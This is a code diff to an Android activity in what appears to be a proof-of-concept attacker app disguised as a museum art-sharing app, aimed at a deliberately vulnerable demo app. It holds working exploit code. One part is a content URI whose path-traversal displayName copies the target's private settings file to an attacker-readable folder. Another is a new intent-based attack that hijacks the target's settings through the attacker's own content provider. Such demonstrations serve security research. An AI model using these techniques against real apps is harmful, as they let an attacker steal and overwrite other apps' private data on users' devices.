@@ -34,7 +34,8 @@ class MuseumActivity : ComponentActivity() {
                 ) {
                     MuseumApp(
                         onShareArtwork = { artwork -> shareArtwork(artwork) },
-                        onStealSettings = { stealVulnerableAppSettings() }
+                        onStealSettings = { stealVulnerableAppSettings() },
+                        onHijackSettings = { hijackVulnerableAppSettings() }
                     )
                 }
             }
@@ -122,7 +123,7 @@ Shared via Art Explorer app ✨
             // 2. Uses 'displayName' to trick the vulnerable app into writing
             //    that file to the public SD card using path traversal.
             val maliciousUri = Uri.parse(
-                "content://com.example.dirtystream.fileprovider/root/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?displayName=../../../../../../../../sdcard/stolen_settings.xml"
+                "content://com.example.dirtystream.fileprovider/root/data/data/com.example.dirtystream/shared_prefs/com.example.dirtystream_preferences.xml?displayName=../../../../../../../../storage/emulated/0/Android/data/com.example.dirtystream/files/stolen_settings.xml"
             )
 
             val attackIntent = Intent(Intent.ACTION_SEND).apply {
@@ -137,6 +138,24 @@ Shared via Art Explorer app ✨
 
         } catch (e: Exception) {
             Log.e(TAG, "❌ File read attack failed.", e)
+        }
+    }
+    private fun hijackVulnerableAppSettings() {
+        try {
+            Log.d(TAG, "🔥 Initiating settings hijack attack...")
+            // This Uri points to our NEW provider
+            val maliciousUri = Uri.parse("content://com.artexplorer.museum.hijackprovider/hijack")
+
+            val attackIntent = Intent(Intent.ACTION_SEND).apply {
+                component = ComponentName("com.example.dirtystream", "com.example.dirtystream.MainActivity")
+                putExtra(Intent.EXTRA_STREAM, maliciousUri)
+                type = "text/plain"
+                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
+            }
+            startActivity(attackIntent)
+            Log.d(TAG, "✅ Settings hijack attack launched.")
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ Settings hijack attack failed.", e)
         }
     }
 }
